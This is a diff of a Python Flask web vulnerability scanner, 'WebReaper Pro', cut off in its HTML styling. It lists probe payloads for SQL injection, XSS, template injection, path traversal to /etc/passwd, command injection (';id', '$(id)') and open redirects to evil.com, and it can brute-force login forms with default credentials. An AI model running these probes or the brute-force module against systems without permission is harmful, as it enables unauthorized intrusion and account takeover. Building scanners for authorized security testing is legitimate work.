@@ -1,875 +1,611 @@
 #!/usr/bin/env python3
 """
-WebReaper Pro — Flask Web Interface
-pip install flask requests beautifulsoup4
-python app.py  →  http://localhost:5000
+WebReaper Pro v5 — Flask + engine maison
+pip install requests beautifulsoup4 flask
+python app.py → http://localhost:5000
 """
 
-from flask import Flask, render_template_string, request, Response, jsonify
-import threading, queue, json, time, re, sys, uuid
-from urllib.parse import urlparse, urljoin, urlencode, urldefrag, parse_qsl, urlunparse
-from collections import deque
+import threading, uuid, warnings
 from datetime import datetime
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
 
-try:
-    import requests as req
-    req.packages.urllib3.disable_warnings()
-    from bs4 import BeautifulSoup
-except ImportError:
-    print("pip install flask requests beautifulsoup4")
-    sys.exit(1)
+import requests
+from bs4 import BeautifulSoup
+from flask import Flask, jsonify, render_template_string, request as freq
 
+warnings.filterwarnings("ignore")
 app = Flask(__name__)
 
-# scan_id → {"queue": Queue, "done": bool}
-SCANS = {}
+SCANS = {}  # scan_id → {lines:[], done:bool}
 
-# ══════════════════════════════════════════════════
-# PAYLOADS
-# ══════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
+#  SCANNER ENGINE
+# ══════════════════════════════════════════════════════════════
 
-SQLI_ERROR_PAYLOADS = [
-    "'", "''", "`",
-    "' OR '1'='1'--", "' OR 1=1--",
-    "1' ORDER BY 1--", "1' ORDER BY 99--",
-    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL--",
-    "admin'--", "' AND 1=1--", "' AND 1=2--",
+SQLI_PAYLOADS = ["'", "''", "1 OR 1=1", "1' OR '1'='1", "1 AND SLEEP(0)--"]
+SQLI_ERRORS   = [
+    "sql syntax","mysql_fetch","you have an error","unclosed quotation",
+    "ora-","sqlite","postgresql","mssql","syntax error","invalid query",
+    "warning: mysql","pg_query","unterminated string",
 ]
-
-SQLI_TIME_PAYLOADS = [
-    ("' AND SLEEP(4)--", 4),
-    ("'; WAITFOR DELAY '0:0:4'--", 4),
-    ("' AND (SELECT * FROM (SELECT(SLEEP(4)))x)--", 4),
+XSS_PAYLOAD   = "<wr3aper>"
+SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "<%=7*7%>"]
+LFI_PAYLOADS  = [
+    "../../../../etc/passwd",
+    "....//....//....//etc/passwd",
+    "../../../../windows/win.ini",
 ]
-
-SQLI_ERRORS = [
-    r"you have an error in your sql syntax",
-    r"warning.*?mysql_", r"unclosed quotation mark",
-    r"ora-\d{4,5}", r"microsoft ole db provider for sql server",
-    r"odbc sql server driver", r"postgresql.*?error",
-    r"sqlite3?\.", r"syntax error.*?near",
-    r"supplied argument is not a valid mysql",
-    r"mysql_fetch_array\(\)", r"column count doesn't match",
-    r"unknown column", r"table.*?doesn't exist",
-    r"division by zero", r"invalid use of null",
+CMD_PAYLOADS  = [";id", "|id", "&&id", ";whoami", "`id`", "$(id)"]
+CMD_INDICATORS = ["uid=", "www-data", "root", "nobody", "[extensions]"]
+REDIRECT_PAYLOADS = ["https://evil.com", "//evil.com"]
+SENSITIVE_PATHS = [
+    ".env","config.php","config.ini","database.yml","settings.py",
+    ".git/HEAD",".svn/entries","phpinfo.php","info.php","test.php",
+    "admin/","wp-admin/","administrator/","backup.zip","backup.tar.gz",
+    "robots.txt","sitemap.xml","server-status","server-info","web.config",
+    "package.json","Dockerfile",".DS_Store",
+    "api/v1/users","api/users","graphql","swagger.json","openapi.json",
 ]
-
-XSS_PAYLOADS = [
-    '<script>alert(1)</script>',
-    '<img src=x onerror=alert(1)>',
-    '\'"><script>alert(1)</script>',
-    '<svg onload=alert(1)>',
-    '"><img src=x onerror=alert(1)>',
-    '<details open ontoggle=alert(1)>',
+SECURITY_HEADERS = [
+    ("strict-transport-security", "MEDIUM", "Missing HSTS header"),
+    ("x-frame-options",           "MEDIUM", "Missing X-Frame-Options (Clickjacking)"),
+    ("x-content-type-options",    "LOW",    "Missing X-Content-Type-Options"),
+    ("content-security-policy",   "MEDIUM", "Missing Content-Security-Policy"),
+    ("x-xss-protection",          "LOW",    "Missing X-XSS-Protection"),
+    ("referrer-policy",           "LOW",    "Missing Referrer-Policy"),
 ]
+CORS_ORIGINS = ["https://evil.com", "null", "http://attacker.local"]
+UA = "Mozilla/5.0 (WebReaper/5.0; Security Scanner)"
 
-CMDI_PAYLOADS = [
-    ("; id",          ["uid=","root","www-data"]),
-    ("| id",          ["uid=","root","www-data"]),
-    ("$(id)",         ["uid=","root"]),
-    ("; cat /etc/passwd", ["root:x:0:0","daemon:","nobody:"]),
-]
-
-LFI_PAYLOADS = [
-    ("../etc/passwd",         ["root:x:0:0","daemon:","/bin/"]),
-    ("../../etc/passwd",      ["root:x:0:0","daemon:","/bin/"]),
-    ("../../../etc/passwd",   ["root:x:0:0","daemon:","/bin/"]),
-    ("../../../../etc/passwd",["root:x:0:0","daemon:","/bin/"]),
-    ("../../windows/win.ini", ["[fonts]","[extensions]"]),
-    ("php://filter/convert.base64-encode/resource=index.php", ["PD9waHA"]),
-]
-
-SSTI_PAYLOADS = [
-    ("{{7*7}}", "49"), ("${7*7}", "49"),
-    ("#{7*7}", "49"),  ("*{7*7}", "49"),
-]
-
-SENSITIVE_FILES = [
-    "/.env","/.env.local","/.env.production","/.git/config","/.git/HEAD",
-    "/config.php","/wp-config.php","/database.sql","/dump.sql","/backup.sql",
-    "/admin/","/phpmyadmin/","/phpMyAdmin/","/.htaccess","/.htpasswd",
-    "/.ssh/id_rsa","/server-status","/robots.txt","/sitemap.xml",
-    "/swagger.json","/openapi.json","/api-docs","/actuator/env",
-    "/phpinfo.php","/info.php","/debug.php","/test.php","/backup/",
-    "/package.json","/composer.json","/requirements.txt","/Dockerfile",
-    "/docker-compose.yml","/.dockerenv","/wp-login.php","/wp-admin/",
-]
-
-SECURITY_HEADERS = {
-    "Strict-Transport-Security": "HSTS missing",
-    "Content-Security-Policy":   "CSP missing",
-    "X-Frame-Options":           "Clickjacking protection missing",
-    "X-Content-Type-Options":    "MIME sniffing protection missing",
-    "X-XSS-Protection":          "XSS filter not set",
-    "Referrer-Policy":           "Referrer policy not set",
-}
-
-# ══════════════════════════════════════════════════
-# SCANNER ENGINE
-# ══════════════════════════════════════════════════
 
 def make_session():
-    s = req.Session()
+    s = requests.Session()
+    s.headers["User-Agent"] = UA
     s.verify = False
-    s.headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0",
-        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
-    })
+    s.timeout = 10
     return s
 
-def get_params(url):
-    return dict(parse_qsl(urlparse(url).query))
 
-def inject_url(url, param, value):
-    p = urlparse(url)
-    params = dict(parse_qsl(p.query))
-    params[param] = value
-    return urlunparse(p._replace(query=urlencode(params)))
+def inject_param(url, key, value):
+    """Replace one query param value in url."""
+    p  = urlparse(url)
+    qs = parse_qs(p.query, keep_blank_values=True)
+    qs[key] = [value]
+    new_q = urlencode({k: v[0] for k, v in qs.items()})
+    return urlunparse(p._replace(query=new_q))
 
-def scan(target, deep, brute, emit):
-    S       = make_session()
-    TIMEOUT = 10
-    origin  = f"{urlparse(target).scheme}://{urlparse(target).netloc}"
-    reported = set()
 
-    def log(level, msg, detail=""):
-        key = f"{level}:{msg[:80]}"
-        if key in reported:
-            return
-        reported.add(key)
-        emit({"level": level, "msg": msg, "detail": detail,
-              "ts": datetime.now().strftime("%H:%M:%S")})
+def safe_get(sess, url, **kw):
+    try:
+        return sess.get(url, allow_redirects=False, **kw)
+    except Exception:
+        return None
 
-    def get(url, **kw):
+
+def safe_post(sess, url, data, **kw):
+    try:
+        return sess.post(url, data=data, allow_redirects=False, **kw)
+    except Exception:
+        return None
+
+
+# ── crawl ──────────────────────────────────────────────────────
+
+def crawl(sess, base, deep=False):
+    base_host = urlparse(base).netloc
+    limit     = 60 if deep else 25
+    visited, queue, pages = set(), [base], []
+
+    while queue and len(visited) < limit:
+        url = queue.pop(0)
+        if url in visited:
+            continue
+        visited.add(url)
+        r = safe_get(sess, url)
+        if r is None:
+            continue
+        pages.append((url, r))
         try:
-            return S.get(url, timeout=TIMEOUT, **kw)
-        except Exception:
-            return None
-
-    def post(url, data, **kw):
-        try:
-            return S.post(url, data=data, timeout=TIMEOUT, **kw)
-        except Exception:
-            return None
-
-    # ── headers ────────────────────────────────────
-    emit({"type":"phase","msg":"Checking headers & fingerprint..."})
-    r = get(target)
-    if r:
-        hdrs = {k.lower(): v for k, v in r.headers.items()}
-        for h, reason in SECURITY_HEADERS.items():
-            if h.lower() not in hdrs:
-                log("LOW", f"Missing Header: {h}", reason)
-        if "server" in hdrs:
-            log("INFO", f"Server: {hdrs['server']}")
-        if "x-powered-by" in hdrs:
-            log("MEDIUM", f"X-Powered-By: {hdrs['x-powered-by']}", "stack disclosure")
-        for name, val in r.headers.items():
-            if name.lower() == "set-cookie":
-                flags = val.lower()
-                if "httponly" not in flags:
-                    log("MEDIUM", "Cookie missing HttpOnly", val[:60])
-                if "secure" not in flags:
-                    log("LOW", "Cookie missing Secure", val[:60])
-
-    # ── CORS ───────────────────────────────────────
-    r2 = get(target, headers={"Origin": "https://evil-attacker.pwned.com"})
-    if r2:
-        acao = r2.headers.get("Access-Control-Allow-Origin","")
-        acac = r2.headers.get("Access-Control-Allow-Credentials","")
-        if acao == "*":
-            log("MEDIUM","CORS Wildcard","any origin can read responses")
-        elif "evil-attacker" in acao:
-            log("CRITICAL" if acac.lower()=="true" else "HIGH",
-                "CORS Misconfiguration", f"reflects evil origin | credentials={acac}")
-
-    # ── sensitive files ────────────────────────────
-    emit({"type":"phase","msg":"Probing sensitive files..."})
-    for path in SENSITIVE_FILES:
-        try:
-            r = S.get(origin + path, timeout=6, allow_redirects=False, verify=False)
-            if r.status_code == 200 and len(r.text) > 10:
-                sev = ("CRITICAL" if any(x in path for x in
-                       (".env","id_rsa","wp-config","database.sql",".git/config","dump.sql")) else
-                       "HIGH" if any(x in path for x in
-                       ("admin","phpinfo","swagger","actuator","debug")) else "MEDIUM")
-                log(sev, f"Sensitive File: {path}", f"{r.status_code} | {len(r.text)} bytes")
+            soup = BeautifulSoup(r.text, "html.parser")
+            for tag in soup.find_all(["a", "form"]):
+                href = tag.get("href") or tag.get("action")
+                if not href:
+                    continue
+                full = urljoin(url, href)
+                p    = urlparse(full)
+                if p.netloc == base_host and full not in visited:
+                    queue.append(full)
         except Exception:
             pass
+    return pages
 
-    # ── crawler ────────────────────────────────────
-    emit({"type":"phase","msg":"Crawling site..."})
-    visited   = set()
-    all_urls  = []
-    all_forms = []
-    frontier  = [target]
-    MAX_URLS  = 300 if deep else 80
-    DEPTH     = 4   if deep else 2
 
-    for depth in range(DEPTH + 1):
-        if not frontier or len(all_urls) >= MAX_URLS:
-            break
-        next_frontier = []
-        for url in frontier:
-            if len(all_urls) >= MAX_URLS:
-                break
-            norm = urldefrag(url)[0]
-            if norm in visited:
-                continue
-            visited.add(norm)
-            r = get(url)
-            if not r or r.status_code in (404,403,410):
-                continue
-            if "text/html" not in r.headers.get("content-type",""):
-                continue
-            all_urls.append(url)
-            emit({"type":"crawl","msg":f"Crawled [{len(all_urls)}/{MAX_URLS}]: {url[:80]}"})
+def get_forms(url, html):
+    soup = BeautifulSoup(html, "html.parser")
+    out  = []
+    for form in soup.find_all("form"):
+        action = urljoin(url, form.get("action") or url)
+        method = form.get("method", "get").lower()
+        inputs = {}
+        for inp in form.find_all(["input", "textarea", "select"]):
+            name  = inp.get("name")
+            value = inp.get("value") or inp.get("placeholder") or "test"
+            t     = inp.get("type", "text").lower()
+            if name and t not in ("submit", "button", "image", "reset"):
+                inputs[name] = value
+        if inputs:
+            out.append({"action": action, "method": method, "inputs": inputs})
+    return out
 
-            soup = BeautifulSoup(r.text, "html.parser")
 
-            for form_tag in soup.find_all("form"):
-                action = form_tag.get("action","") or url
-                action = urljoin(url, action)
-                method = form_tag.get("method","GET").upper()
-                inputs = []
-                for inp in form_tag.find_all(["input","textarea","select"]):
-                    name  = inp.get("name","")
-                    itype = inp.get("type","text").lower()
-                    val   = inp.get("value","") or (
-                        "test@test.com" if itype=="email" else
-                        "test123"       if itype=="password" else "test")
-                    if name:
-                        inputs.append({"name":name,"type":itype,"value":val})
-                if inputs:
-                    key = (action, method, tuple(i["name"] for i in inputs))
-                    if key not in {(f["action"],f["method"],tuple(i["name"] for i in f["inputs"])) for f in all_forms}:
-                        all_forms.append({"action":action,"method":method,"inputs":inputs})
+# ── sqli ──────────────────────────────────────────────────────
 
-            for a in soup.find_all("a", href=True):
-                href = a["href"].strip()
-                if href.startswith(("javascript:","mailto:","tel:","#")):
-                    continue
-                full = urldefrag(urljoin(url, href))[0]
-                if urlparse(full).netloc == urlparse(origin).netloc:
-                    next_frontier.append(full)
+def has_sqli_error(text):
+    low = text.lower()
+    return any(e in low for e in SQLI_ERRORS)
 
-        seen = set()
-        frontier = [u for u in next_frontier
-                    if urldefrag(u)[0] not in visited and
-                    urldefrag(u)[0] not in seen and not seen.add(urldefrag(u)[0])]
 
-    emit({"type":"phase","msg":f"Crawled {len(all_urls)} URLs | {len(all_forms)} forms found"})
+def test_sqli_url(sess, url, params, emit):
+    for pname in params:
+        for payload in SQLI_PAYLOADS:
+            injected = inject_param(url, pname, payload)
+            r = safe_get(sess, injected)
+            if r and has_sqli_error(r.text):
+                emit("HIGH", f"SQLi (error-based) → {url}", f"param={pname!r} payload={payload!r}")
+                return
 
-    param_urls = [u for u in all_urls if "?" in u]
-    emit({"type":"phase","msg":f"Testing {len(param_urls)} parametric URLs..."})
 
-    # ── SQLi ───────────────────────────────────────
-    for url in param_urls:
-        params = get_params(url)
-        path   = urlparse(url).path
-        for param, orig in params.items():
-            for payload in SQLI_ERROR_PAYLOADS:
-                r = get(inject_url(url, param, orig + payload))
-                if r:
-                    for err in SQLI_ERRORS:
-                        if re.search(err, r.text, re.I):
-                            log("CRITICAL", f"SQLi Error → {path}?{param}",
-                                f"payload: {payload}")
-                            break
-            # boolean blind
-            r0 = get(url)
-            rt = get(inject_url(url, param, orig + "' AND '1'='1"))
-            rf = get(inject_url(url, param, orig + "' AND '1'='2"))
-            if r0 and rt and rf:
-                if abs(len(rt.text)-len(r0.text))<30 and abs(len(rt.text)-len(rf.text))>50:
-                    log("CRITICAL", f"SQLi Boolean Blind → {path}?{param}",
-                        f"true_len={len(rt.text)} false_len={len(rf.text)}")
-            # time-based
-            for payload, thresh in SQLI_TIME_PAYLOADS:
-                t0 = time.time()
-                get(inject_url(url, param, orig + payload))
-                if time.time()-t0 >= thresh-0.5:
-                    log("CRITICAL", f"SQLi Time-based → {path}?{param}", f"delay ≥ {thresh}s")
+def test_sqli_form(sess, form, emit):
+    for pname in form["inputs"]:
+        for payload in SQLI_PAYLOADS:
+            d = dict(form["inputs"])
+            d[pname] = payload
+            r = (safe_post(sess, form["action"], d)
+                 if form["method"] == "post"
+                 else safe_get(sess, form["action"], params=d))
+            if r and has_sqli_error(r.text):
+                emit("HIGH", f"SQLi (form) → {form['action']}", f"param={pname!r} payload={payload!r}")
+                return
 
-    # ── XSS ────────────────────────────────────────
-    for url in param_urls:
-        params = get_params(url)
-        path   = urlparse(url).path
-        for param in params:
-            for payload in XSS_PAYLOADS:
-                r = get(inject_url(url, param, payload))
-                if r and payload.lower() in r.text.lower():
-                    log("HIGH", f"XSS Reflected → {path}?{param}", f"payload: {payload[:50]}")
-                    break
 
-    # ── LFI ────────────────────────────────────────
-    FILE_PARAMS = {"file","page","path","include","load","view","doc",
-                   "cat","module","lang","locale","read","open","name","filename","pg","p"}
-    for url in param_urls:
-        params = get_params(url)
-        path   = urlparse(url).path
-        targets = [p for p in params if p.lower() in FILE_PARAMS] or list(params.keys())
-        for param in targets:
-            for payload, inds in LFI_PAYLOADS:
-                r = get(inject_url(url, param, payload))
-                if r:
-                    for ind in inds:
-                        if ind in r.text:
-                            log("CRITICAL", f"LFI → {path}?{param}", f"payload: {payload}")
-                            break
+# ── xss ───────────────────────────────────────────────────────
 
-    # ── CMDi ───────────────────────────────────────
-    for url in param_urls:
-        params = get_params(url)
-        path   = urlparse(url).path
-        for param, orig in params.items():
-            for payload, inds in CMDI_PAYLOADS:
-                r = get(inject_url(url, param, orig + payload))
-                if r:
-                    for ind in inds:
-                        if ind in r.text:
-                            log("CRITICAL", f"CMDi → {path}?{param}", f"payload: {payload}")
-                            break
+def test_xss_url(sess, url, params, emit):
+    for pname in params:
+        injected = inject_param(url, pname, XSS_PAYLOAD)
+        r = safe_get(sess, injected)
+        if r and XSS_PAYLOAD in r.text:
+            emit("HIGH", f"XSS (reflected) → {url}", f"param={pname!r}")
+            return
 
-    # ── SSTI ───────────────────────────────────────
-    for url in param_urls:
-        params = get_params(url)
-        path   = urlparse(url).path
-        for param in params:
-            for payload, expected in SSTI_PAYLOADS:
-                r = get(inject_url(url, param, payload))
-                if r and expected in r.text and payload not in r.text:
-                    log("CRITICAL", f"SSTI → {path}?{param}", f"payload {payload} → got '{expected}'")
 
-    # ── Forms SQLi+XSS ─────────────────────────────
-    emit({"type":"phase","msg":f"Testing {len(all_forms)} forms..."})
-    for form in all_forms:
-        editable = [i for i in form["inputs"]
-                    if i["type"] not in ("hidden","submit","button","image","reset")]
-        if not editable:
+def test_xss_form(sess, form, emit):
+    for pname in form["inputs"]:
+        d = dict(form["inputs"])
+        d[pname] = XSS_PAYLOAD
+        r = (safe_post(sess, form["action"], d)
+             if form["method"] == "post"
+             else safe_get(sess, form["action"], params=d))
+        if r and XSS_PAYLOAD in r.text:
+            emit("HIGH", f"XSS (form) → {form['action']}", f"param={pname!r}")
+            return
+
+
+# ── ssti ──────────────────────────────────────────────────────
+
+def test_ssti_url(sess, url, params, emit):
+    for pname in params:
+        for payload in SSTI_PAYLOADS:
+            injected = inject_param(url, pname, payload)
+            r = safe_get(sess, injected)
+            if r and "49" in r.text:
+                emit("CRITICAL", f"SSTI → {url}", f"param={pname!r} payload={payload!r}")
+                return
+
+
+# ── lfi ───────────────────────────────────────────────────────
+
+def test_lfi_url(sess, url, params, emit):
+    for pname in params:
+        for payload in LFI_PAYLOADS:
+            injected = inject_param(url, pname, payload)
+            r = safe_get(sess, injected)
+            if r and ("root:x:0:" in r.text or "[extensions]" in r.text.lower()):
+                emit("CRITICAL", f"LFI → {url}", f"param={pname!r}")
+                return
+
+
+# ── cmd injection ─────────────────────────────────────────────
+
+def test_cmdi_url(sess, url, params, emit):
+    for pname in params:
+        for payload in CMD_PAYLOADS:
+            injected = inject_param(url, pname, payload)
+            r = safe_get(sess, injected)
+            if r and any(ind in r.text for ind in CMD_INDICATORS):
+                emit("CRITICAL", f"Command Injection → {url}", f"param={pname!r} payload={payload!r}")
+                return
+
+
+# ── open redirect ─────────────────────────────────────────────
+
+def test_redirect_url(sess, url, params, emit):
+    for pname in params:
+        for payload in REDIRECT_PAYLOADS:
+            injected = inject_param(url, pname, payload)
+            r = safe_get(sess, injected)
+            if r and r.status_code in (301, 302, 303, 307, 308):
+                loc = r.headers.get("Location", "")
+                if "evil.com" in loc:
+                    emit("MEDIUM", f"Open Redirect → {url}", f"param={pname!r} → {loc}")
+                    return
+
+
+# ── security headers ──────────────────────────────────────────
+
+def test_headers(sess, base, emit):
+    r = safe_get(sess, base)
+    if r is None:
+        return
+    h = {k.lower(): v for k, v in r.headers.items()}
+    for key, sev, msg in SECURITY_HEADERS:
+        if key not in h:
+            emit(sev, msg, base)
+    if "server" in h and h["server"]:
+        emit("LOW", f"Server banner: {h['server']}", base)
+    if "x-powered-by" in h:
+        emit("LOW", f"X-Powered-By: {h['x-powered-by']}", base)
+
+
+# ── cors ──────────────────────────────────────────────────────
+
+def test_cors(sess, base, emit):
+    for origin in CORS_ORIGINS:
+        r = safe_get(sess, base, headers={"Origin": origin})
+        if r is None:
             continue
+        acao = r.headers.get("Access-Control-Allow-Origin", "")
+        acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()
+        if acao in (origin, "*"):
+            sev = "HIGH" if acac == "true" else "MEDIUM"
+            emit(sev, "CORS misconfiguration", f"Origin={origin!r} → {acao!r} credentials={acac!r}")
+            return
 
-        # SQLi
-        for payload in SQLI_ERROR_PAYLOADS[:8]:
-            data = {i["name"]:i["value"] for i in form["inputs"]}
-            for inp in editable:
-                data[inp["name"]] = inp["value"] + payload
-            r = (post(form["action"],data) if form["method"]=="POST"
-                 else get(form["action"], params=data))
-            if r:
-                for err in SQLI_ERRORS:
-                    if re.search(err, r.text, re.I):
-                        log("CRITICAL", f"SQLi Form → {form['action']}", f"payload: {payload}")
-                        break
 
-        # XSS
-        for payload in XSS_PAYLOADS[:4]:
-            data = {i["name"]:i["value"] for i in form["inputs"]}
-            for inp in editable:
-                data[inp["name"]] = payload
-            r = (post(form["action"],data) if form["method"]=="POST"
-                 else get(form["action"], params=data))
-            if r and payload.lower() in r.text.lower():
-                log("HIGH", f"XSS Form → {form['action']}", f"payload: {payload[:50]}")
-                break
+# ── sensitive files ───────────────────────────────────────────
 
-    # ── brute force ────────────────────────────────
-    if brute:
-        emit({"type":"phase","msg":"Brute forcing login forms..."})
-        USERS = ["admin","administrator","root","user","test","guest"]
-        PASSWORDS = ["admin","password","123456","admin123","root","test",
-                     "qwerty","letmein","welcome","pass","changeme","secret"]
-        login_forms = [f for f in all_forms if any(i["type"]=="password" for i in f["inputs"])]
-        for form in login_forms:
-            u_inp = next((i for i in form["inputs"] if i["type"] in ("text","email")), None)
-            p_inp = next((i for i in form["inputs"] if i["type"]=="password"), None)
-            if not u_inp or not p_inp:
-                continue
-            FAIL = {"invalid","incorrect","wrong","failed","error","denied"}
-            for user in USERS:
-                for pwd in PASSWORDS:
-                    data = {i["name"]:i["value"] for i in form["inputs"]}
-                    data[u_inp["name"]] = user
-                    data[p_inp["name"]] = pwd
-                    r = (post(form["action"],data) if form["method"]=="POST"
-                         else get(form["action"],params=data))
-                    if r and not any(w in r.text.lower() for w in FAIL):
-                        log("CRITICAL", f"Login found → {form['action']}",
-                            f"user={user} pass={pwd}")
-                        break
+def test_sensitive(sess, base, emit):
+    base = base.rstrip("/")
+    for path in SENSITIVE_PATHS:
+        url = f"{base}/{path}"
+        r   = safe_get(sess, url)
+        if r is None:
+            continue
+        if r.status_code == 200:
+            sev = ("CRITICAL" if any(x in path for x in
+                   [".env", "config", "phpinfo", "database", "settings"])
+                   else "HIGH")
+            emit(sev, f"Sensitive file exposed ({path})", url)
+        elif r.status_code == 403:
+            emit("INFO", f"Protected path (403): {path}", url)
 
-    emit({"type":"done","msg":"Scan complete"})
 
-# ══════════════════════════════════════════════════
-# FLASK ROUTES
-# ══════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
+#  SCAN COORDINATOR
+# ══════════════════════════════════════════════════════════════
 
-HTML = """<!DOCTYPE html>
+def scan_worker(sid, target, deep, brute):
+    state = SCANS[sid]
+
+    def emit(level, msg, detail=""):
+        state["lines"].append({
+            "type": "finding", "level": level,
+            "msg": msg, "detail": detail,
+            "ts": datetime.now().strftime("%H:%M:%S"),
+        })
+
+    def log(msg):
+        state["lines"].append({
+            "type": "log", "msg": msg,
+            "ts": datetime.now().strftime("%H:%M:%S"),
+        })
+
+    try:
+        sess = make_session()
+        log(f"Scanning {target}")
+
+        log("Phase 1 — Security headers + CORS")
+        test_headers(sess, target, emit)
+        test_cors(sess, target, emit)
+
+        log("Phase 2 — Sensitive files discovery")
+        test_sensitive(sess, target, emit)
+
+        log(f"Phase 3 — Crawling ({'deep' if deep else 'standard'})")
+        pages = crawl(sess, target, deep)
+        log(f"  {len(pages)} pages found")
+
+        log("Phase 4 — Injection tests")
+        for url, resp in pages:
+            parsed = urlparse(url)
+            qs     = parse_qs(parsed.query, keep_blank_values=True)
+            params = {k: v[0] for k, v in qs.items()}
+
+            if params:
+                test_sqli_url(sess, url, params, emit)
+                test_xss_url(sess, url, params, emit)
+                test_lfi_url(sess, url, params, emit)
+                test_ssti_url(sess, url, params, emit)
+                test_cmdi_url(sess, url, params, emit)
+                test_redirect_url(sess, url, params, emit)
+
+            for form in get_forms(url, resp.text):
+                test_sqli_form(sess, form, emit)
+                test_xss_form(sess, form, emit)
+
+        if brute:
+            log("Phase 5 — Brute force logins")
+            USERS  = ["admin","root","user","administrator","test","guest"]
+            PASSES = ["admin","password","123456","root","admin123","pass","1234","letmein"]
+            for url, resp in pages:
+                for form in get_forms(url, resp.text):
+                    pw_f  = [n for n in form["inputs"] if "pass" in n.lower() or "pwd" in n.lower()]
+                    usr_f = [n for n in form["inputs"] if any(x in n.lower() for x in ["user","login","email","name"])]
+                    if not pw_f or not usr_f:
+                        continue
+                    uf, pf = usr_f[0], pw_f[0]
+                    found = False
+                    for u in USERS:
+                        if found:
+                            break
+                        for p in PASSES:
+                            d = dict(form["inputs"]); d[uf] = u; d[pf] = p
+                            r = (safe_post(sess, form["action"], d)
+                                 if form["method"] == "post"
+                                 else safe_get(sess, form["action"], params=d))
+                            if r and r.status_code == 200 and any(
+                                x in r.text.lower()
+                                for x in ["welcome","dashboard","logout","profile","success"]
+                            ):
+                                emit("CRITICAL", f"Brute force → {form['action']}",
+                                     f"{uf}={u!r}  {pf}={p!r}")
+                                found = True; break
+
+        total = sum(1 for l in state["lines"] if l.get("type") == "finding")
+        log(f"Done — {total} findings across {len(pages)} pages")
+
+    except Exception as e:
+        state["lines"].append({
+            "type": "log",
+            "msg": f"[!] Scan error: {e}",
+            "ts": datetime.now().strftime("%H:%M:%S"),
+        })
+
+    state["done"] = True
+
+
+# ══════════════════════════════════════════════════════════════
+#  HTML
+# ══════════════════════════════════════════════════════════════
+
+HTML = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>WebReaper Pro</title>
 <style>
-  :root {
-    --bg:   #0d0d0d;
-    --bg2:  #141414;
-    --bg3:  #1a1a1a;
-    --brd:  #2a2a2a;
-    --acc:  #ff3333;
-    --acc2: #ff6600;
-    --txt:  #e8e8e8;
-    --dim:  #888;
-    --crit: #ff3333;
-    --high: #ff6b35;
-    --med:  #ffc107;
-    --low:  #4dabf7;
-    --info: #69db7c;
-    --scan: #cc99ff;
-  }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    background: var(--bg);
-    color: var(--txt);
-    font-family: 'Courier New', monospace;
-    min-height: 100vh;
-  }
-  header {
-    background: var(--bg2);
-    border-bottom: 1px solid var(--brd);
-    padding: 18px 32px;
-    display: flex;
-    align-items: center;
-    gap: 16px;
-  }
-  .logo {
-    font-size: 22px;
-    font-weight: bold;
-    color: var(--acc);
-    letter-spacing: 2px;
-    text-shadow: 0 0 20px rgba(255,51,51,0.4);
-  }
-  .logo span { color: var(--txt); }
-  .subtitle { color: var(--dim); font-size: 12px; }
-  .container { max-width: 1100px; margin: 0 auto; padding: 32px 20px; }
-
-  .scan-box {
-    background: var(--bg2);
-    border: 1px solid var(--brd);
-    border-radius: 8px;
-    padding: 28px;
-    margin-bottom: 24px;
-  }
-  .scan-box h2 { color: var(--acc); margin-bottom: 20px; font-size: 14px; letter-spacing: 1px; }
-  .input-row {
-    display: flex;
-    gap: 10px;
-    flex-wrap: wrap;
-    align-items: center;
-  }
-  input[type=url] {
-    flex: 1;
-    min-width: 280px;
-    background: var(--bg3);
-    border: 1px solid var(--brd);
-    border-radius: 6px;
-    color: var(--txt);
-    padding: 12px 16px;
-    font-family: monospace;
-    font-size: 14px;
-    outline: none;
-    transition: border-color .2s;
-  }
-  input[type=url]:focus { border-color: var(--acc); }
-  .checkboxes {
-    display: flex;
-    gap: 20px;
-    margin-top: 14px;
-    flex-wrap: wrap;
-  }
-  .checkboxes label {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    font-size: 13px;
-    color: var(--dim);
-    cursor: pointer;
-    user-select: none;
-  }
-  .checkboxes label:hover { color: var(--txt); }
-  input[type=checkbox] { accent-color: var(--acc); width: 15px; height: 15px; }
-  button {
-    background: var(--acc);
-    color: #fff;
-    border: none;
-    border-radius: 6px;
-    padding: 12px 28px;
-    font-family: monospace;
-    font-size: 14px;
-    font-weight: bold;
-    cursor: pointer;
-    letter-spacing: 1px;
-    transition: background .2s, transform .1s;
-  }
-  button:hover:not(:disabled) { background: #cc0000; transform: translateY(-1px); }
-  button:disabled { background: #444; cursor: not-allowed; }
-  #stop-btn {
-    background: #333;
-    border: 1px solid var(--brd);
-    display: none;
-  }
-  #stop-btn:hover { background: #444; }
-
-  .stats-row {
-    display: grid;
-    grid-template-columns: repeat(5, 1fr);
-    gap: 10px;
-    margin-bottom: 20px;
-  }
-  .stat-card {
-    background: var(--bg2);
-    border: 1px solid var(--brd);
-    border-radius: 8px;
-    padding: 16px;
-    text-align: center;
-  }
-  .stat-card .count { font-size: 28px; font-weight: bold; }
-  .stat-card .label { font-size: 11px; color: var(--dim); margin-top: 4px; letter-spacing: 1px; }
-  .stat-card.crit .count { color: var(--crit); }
-  .stat-card.high .count { color: var(--high); }
-  .stat-card.med  .count { color: var(--med);  }
-  .stat-card.low  .count { color: var(--low);  }
-  .stat-card.info .count { color: var(--info); }
-
-  .results-box {
-    background: var(--bg2);
-    border: 1px solid var(--brd);
-    border-radius: 8px;
-    overflow: hidden;
-  }
-  .results-header {
-    padding: 14px 20px;
-    border-bottom: 1px solid var(--brd);
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    font-size: 13px;
-    color: var(--dim);
-  }
-  #log {
-    height: 480px;
-    overflow-y: auto;
-    padding: 16px;
-    font-size: 13px;
-    line-height: 1.7;
-    scroll-behavior: smooth;
-  }
